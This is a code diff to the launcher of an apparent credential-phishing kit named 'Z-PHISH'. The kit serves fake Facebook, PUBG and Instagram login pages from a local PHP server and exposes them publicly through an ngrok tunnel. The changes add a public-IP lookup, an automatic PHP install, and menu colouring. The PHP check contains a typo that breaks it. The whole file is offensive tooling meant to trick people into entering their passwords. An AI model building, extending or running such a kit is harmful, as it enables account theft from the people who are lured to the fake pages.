@@ -17,6 +17,13 @@ def get_ngrok_url():
     res_json = json.loads(res_unicode)
     a =  res_json["tunnels"][0]["public_url"]
 
+def ip():
+    global IP
+    ip_url = "http://ip-api.com/json/"
+    request = requests.get(ip_url).json()
+    if request['status'] == "success":
+        IP = (f"{request['query']}")
+ip()
 
 try:
     os.system("killall ngrok > /dev/null 2>&1 & ")
@@ -24,8 +31,13 @@ try:
 
 except:
     pass
-exit_code = os.system('command -v ngrok > /dev/null 2>&1')
-if exit_code == 0:
+ngrok_check = os.system('command -v ngrok > /dev/null 2>&1')
+php_check = os.system('command - v php  > /dev/null 2>&1')
+if php_check ==0:
+    pass
+else:
+    os.system('apt install php')
+if ngrok_check == 0:
     pass
 else:
 
@@ -37,6 +49,7 @@ else:
     token = input("Please enter key only \nEnter authtoken: ")
     os.system(f"ngrok authtoken {token}")
 def start(site):
+
     os.system("ngrok http 5555 > /dev/null 2>&1 &")
     print(f'{Fore.YELLOW}\n[+] Starting PHP Server...')
     time.sleep(3)
@@ -60,16 +73,18 @@ def start(site):
 def slect():
     os.system("clear")
     os.system("figlet Z-PHISH | lolcat")
-    print(f"""{Fore.CYAN}
+    print(f"""{Fore.GREEN}
+    [+]Your IP: {Fore.WHITE}{IP}{Fore.CYAN}
+
     [1] Facebook   [2] PUBG
 
     [3] Instagram  [0] Exit
     """)
-    choo = int(input('\nEnter Number:  '))
+    choo = int(input(f' {Fore.WHITE}\nEnter Number:  '))
     if choo == 1:
-        print("[1] Facebook")
+        print(f"{Fore.YELLOW}[1] Facebook")
         print("[2] Facebook_security")
-        a = int(input("\nEnter Number : "))
+        a = int(input(f"{Fore.WHITE}\nEnter Number : "))
         if a == 1:
           site = "facebook"
           start(site)
